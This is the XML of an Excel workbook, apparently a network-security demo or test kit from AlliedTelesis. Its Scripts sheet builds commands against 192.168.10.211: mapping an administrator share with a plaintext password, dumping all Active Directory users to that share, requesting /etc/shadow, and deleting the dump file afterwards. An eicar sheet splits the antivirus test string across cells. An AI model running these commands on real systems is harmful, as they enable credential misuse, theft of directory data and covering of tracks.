      <c r="A18" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="19" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A19" t="s">
        <v>16</v>
      </c>
    </row>
    <row r="20" spans="1:4" x14ac:dyDescent="0.15">
      <c r="A20" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="22" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B22" t="str">
        <f>"net use Q: "&amp;B3&amp;" "&amp;B6&amp;" /user:"&amp;B5</f>
        <v>net use Q: \\192.168.10.211\share friend1! /user:atkkfwh\administrator</v>
      </c>
      <c r="C22" t="str">
        <f>"net use Y: "&amp;$B3&amp;" "&amp;$B6&amp;" /user:"&amp;$B5</f>
        <v>net use Y: \\192.168.10.211\share friend1! /user:atkkfwh\administrator</v>
      </c>
      <c r="D22" t="s">
        <v>58</v>
      </c>
    </row>
    <row r="23" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B23" t="str">
        <f>"Invoke-Command -ComputerName "&amp;B2&amp;" -Credential $Cred -ScriptBlock { Get-AdUser -Filter * } &gt; Q:\"&amp;B7</f>
        <v>Invoke-Command -ComputerName 192.168.10.211 -Credential $Cred -ScriptBlock { Get-AdUser -Filter * } &gt; Q:\adlist.txt</v>
      </c>
    </row>
    <row r="24" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B24" t="s">
        <v>47</v>
      </c>
    </row>
    <row r="25" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B25" t="str">
        <f>"$ie.navigate(""http://" &amp; B2 &amp; "/etc/shadow"")"</f>
        <v>$ie.navigate("http://192.168.10.211/etc/shadow")</v>
      </c>
    </row>
    <row r="26" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B26" t="s">
        <v>48</v>
      </c>
    </row>
    <row r="28" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B28" t="str">
        <f>"#Invoke-Command -ComputerName "&amp;B2&amp;" -Credential $Cred -ScriptBlock { echo "</f>
        <v xml:space="preserve">#Invoke-Command -ComputerName 192.168.10.211 -Credential $Cred -ScriptBlock { echo </v>
      </c>
    </row>
    <row r="29" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B29" t="str">
        <f>"#copy C:\"&amp;B7&amp;" Q:\"</f>
        <v>#copy C:\adlist.txt Q:\</v>
      </c>
    </row>
    <row r="30" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B30" t="s">
        <v>52</v>
      </c>
      <c r="C30" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="31" spans="1:4" x14ac:dyDescent="0.15">
      <c r="B31" t="str">
        <f>"#del C:\"&amp;B7</f>
        <v>#del C:\adlist.txt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"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C6" sqref="C6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="13.5" x14ac:dyDescent="0.15"/>
  <sheetData>
    <row r="1" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A1" t="str">
        <f>"X5O!P%@AP[4"</f>
        <v>X5O!P%@AP[4</v>
      </c>
    </row>
    <row r="2" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A2" t="str">
        <f>"\PZX54(P^)7CC"</f>
        <v>\PZX54(P^)7CC</v>
      </c>
    </row>
    <row r="3" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A3" t="str">
        <f>")7}$EICAR-S"</f>
        <v>)7}$EICAR-S</v>
      </c>
    </row>
    <row r="4" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A4" t="str">
        <f>"TANDARD-AN"</f>
        <v>TANDARD-AN</v>
      </c>
    </row>
    <row r="5" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A5" t="str">
        <f>"TIVIRUS-TE"</f>
        <v>TIVIRUS-TE</v>
      </c>
    </row>
    <row r="6" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A6" t="str">
        <f>"ST-FILE!$H"</f>
        <v>ST-FILE!$H</v>
      </c>
    </row>
    <row r="7" spans="1:1" x14ac:dyDescent="0.15">
      <c r="A7" t="str">
        <f>"+H*"</f>
        <v>+H*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アンケート</vt:lpstr>
      <vt:lpstr>PingHosts</vt:lpstr>
      <vt:lpstr>Sheet2</vt:lpstr>
      <vt:lpstr>Scripts</vt:lpstr>
      <vt:lpstr>eicar</vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>AlliedTelesis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TANABE Minako</dc:creator>
  <cp:lastModifiedBy>SES-Admin</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2017-12-11T04:10:25Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-09-12T08:58:03Z</dcterms:modified>
</cp:coreProperties>
</file>